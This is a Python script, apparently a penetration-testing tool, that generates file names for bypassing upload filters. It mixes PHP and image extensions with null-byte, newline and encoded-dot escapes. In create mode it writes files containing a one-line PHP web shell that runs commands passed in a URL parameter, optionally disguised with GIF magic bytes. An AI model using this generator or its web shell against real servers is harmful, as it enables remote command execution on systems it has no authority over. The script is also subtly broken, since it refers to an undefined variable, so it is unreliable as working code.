import os
import urllib
import argparse

def write_file(path, filename, data):
    with open(path + filename, 'wb') as f:
        f.write(data)


parser = argparse.ArgumentParser(description='File(names) generator for upload fuzzing')

group1_container = parser.add_argument_group('Mode')
group1 = group1_container.add_mutually_exclusive_group(required=True)
group1.add_argument('-c', '--create', action='store_true', help='')
group1.add_argument('-l', '--list', action='store_true', help='')

group2_container = parser.add_argument_group('Sample size')
group2 = group2_container.add_mutually_exclusive_group(required=True)
group2.add_argument('-b', '--best', action='store_true', help='')
group2.add_argument('-a', '--all', action='store_true', help='')

group3 = parser.add_argument_group('Basic options')
group3.add_argument('-f', '--filename', metavar='', required=True, help='Filename')
group3.add_argument('-e', '--extension', metavar='', help='File extension you want to impersonate')

group4 = parser.add_argument_group('File creation options')
#magic bytes
#ajouter dans les exif
#creation de zip

group5 = parser.add_argument_group('Advanced options')
group5.add_argument('-es', '--escape', metavar='', help='Additionnal escapes')
group5.add_argument('-d', '--dot', metavar='', help='Filename')


#args = parser.parse_args()
args, leftovers = parser.parse_known_args()


dict_headers = {"gif": b"GIF89a", "jpg": b"", "png": b""}

if args.best:
    list_ext_php = ["pHp", "pHp5"]
    list_escape = [" ", "%20", "%00", "%0a"]
else:
    #list_ext_php = ["php", "php3", "php4", "php", "php5", "phtml", "inc", "phar"]
    list_ext_php = ["php", "pHp5", "phtml"]
    list_escape = ["?", "#", ";", "%20", "%00", "%0a", "%0d", "%0a0d", "%0a%0d"]


#list_ending = ["", " ", "."]
list_dot = [".", "%2E", "%252E", "%C0%2E", "%C4%AE", "%C0%AE"]
ext_img = args.extension
filename = args.filename

php_shell = "<?php system($_GET[0]); ?>"
path = os.getcwd() + "/upload/"


for ext_php in list_ext_php:

    for escape in list_escape:

        #for dot in list_dot:

        built_filename = filename + "." + ext_php + escape + "." +  ext_img
        built_filename2 = filename + "." + ext_img + escape + "." + ext_php


        if args.create:

            data = b"" 
            if extension in dict_headers:
                data += dict_headers[extension]

            data += php_shell.encode()
            write_file(path, built_filename, data)
            write_file(path, built_filename2, data)
        else:
            print(built_filename)
            print(built_filename2)
